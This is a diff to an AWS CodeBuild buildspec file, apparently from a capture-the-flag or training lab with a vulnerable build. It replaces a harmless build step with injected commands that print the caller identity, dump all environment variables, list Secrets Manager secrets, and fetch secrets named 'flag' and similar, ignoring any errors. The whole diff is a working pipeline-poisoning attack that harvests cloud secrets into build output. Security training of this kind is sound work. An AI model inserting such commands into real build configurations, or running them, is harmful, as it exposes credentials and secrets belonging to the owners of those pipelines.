@@ -3,6 +3,15 @@ version: 0.2
 phases:
   build:
     commands:
-      - echo "Running vulnerable training build"
-      - env | sort | head -n 20
-      - echo "Done"
+      - echo '=== START ==='
+      - echo '=== IDENTITY ==='
+      - aws sts get-caller-identity || true
+      - echo '=== ENV ==='
+      - env | sort
+      - echo '=== SECRETS LIST ==='
+      - aws secretsmanager list-secrets || true
+      - echo '=== TRY COMMON FLAG NAMES ==='
+      - aws secretsmanager get-secret-value --secret-id flag --query SecretString --output text || true
+      - aws secretsmanager get-secret-value --secret-id FLAG --query SecretString --output text || true
+      - aws secretsmanager get-secret-value --secret-id codebuild_flag --query SecretString --output text || true
+      - echo '=== DONE ==='
